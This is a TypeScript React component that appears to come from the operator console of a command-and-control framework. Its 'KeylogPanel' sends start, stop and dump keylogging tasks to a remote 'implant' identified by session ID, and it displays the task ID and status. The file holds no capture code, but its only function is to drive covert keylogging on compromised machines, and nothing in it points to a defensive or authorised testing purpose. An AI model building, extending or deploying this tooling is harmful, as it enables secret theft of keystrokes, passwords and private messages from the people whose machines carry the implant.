import { useState } from 'react';
import { taskClient } from '../../api';

interface Props {
  sessionId: string;
}

function hexToUint8Array(hex: string): Uint8Array<ArrayBuffer> {
  const buffer = new ArrayBuffer(hex.length / 2);
  const bytes = new Uint8Array(buffer);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

export function KeylogPanel({ sessionId }: Props) {
  const [isRunning, setIsRunning] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [taskId, setTaskId] = useState<string | null>(null);
  const [output, setOutput] = useState<string | null>(null);

  const dispatchTask = async (subcommand: string) => {
    setLoading(true);
    setError(null);
    try {
      const encoder = new TextEncoder();
      const taskData = encoder.encode(subcommand) as Uint8Array<ArrayBuffer>;

      const response = await taskClient.dispatchTask({
        implantId: { value: hexToUint8Array(sessionId) },
        taskType: 'keylog',
        taskData,
      });

      const id = response.taskId
        ? Array.from(response.taskId.value).map(b => b.toString(16).padStart(2, '0')).join('')
        : '';
      setTaskId(id);
      return id;
    } catch (err: any) {
      setError(err.message || 'Failed to dispatch task');
      return null;
    } finally {
      setLoading(false);
    }
  };

  const handleToggle = async () => {
    const subcommand = isRunning ? 'stop' : 'start';
    const id = await dispatchTask(subcommand);
    if (id) {
      setIsRunning(!isRunning);
      setOutput(null);
    }
  };

  const handleDump = async () => {
    await dispatchTask('dump');
    setOutput('Dump dispatched — results will appear in the task stream.');
  };

  return (
    <div className="p-4 space-y-4">
      <div className="flex items-center justify-between">
        <h3 className="text-ctp-text font-semibold text-sm uppercase tracking-wide">Keylogger</h3>
        <span
          className={`inline-flex items-center gap-1.5 text-xs px-2 py-1 rounded-full font-medium ${
            isRunning
              ? 'bg-ctp-green/20 text-ctp-green'
              : 'bg-ctp-surface1 text-ctp-subtext0'
          }`}
        >
          <span
            className={`w-1.5 h-1.5 rounded-full ${isRunning ? 'bg-ctp-green animate-pulse' : 'bg-ctp-subtext0'}`}
          />
          {isRunning ? 'Running' : 'Stopped'}
        </span>
      </div>

      <div className="flex gap-2">
        <button
          onClick={handleToggle}
          disabled={loading}
          className={`px-4 py-2 rounded text-sm font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed ${
            isRunning
              ? 'bg-ctp-red text-ctp-base hover:bg-ctp-red/80'
              : 'bg-ctp-green text-ctp-base hover:bg-ctp-green/80'
          }`}
        >
          {loading ? 'Dispatching...' : isRunning ? 'Stop' : 'Start'}
        </button>
        <button
          onClick={handleDump}
          disabled={loading}
          className="px-4 py-2 rounded text-sm font-medium bg-ctp-surface1 text-ctp-text hover:bg-ctp-surface2 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Dump
        </button>
      </div>

      {error && (
        <div className="px-3 py-2 rounded bg-ctp-red/20 text-ctp-red text-sm border border-ctp-red/30">
          {error}
        </div>
      )}

      {taskId && (
        <div className="text-xs text-ctp-subtext0">
          Task ID: <span className="font-mono text-ctp-blue">{taskId}</span>
        </div>
      )}

      {output && (
        <div className="rounded border border-ctp-surface2 bg-ctp-surface0 p-3">
          <p className="text-xs text-ctp-subtext0 mb-1 uppercase tracking-wide">Output</p>
          <pre className="text-sm text-ctp-text font-mono whitespace-pre-wrap">{output}</pre>
        </div>
      )}
    </div>
  );
}
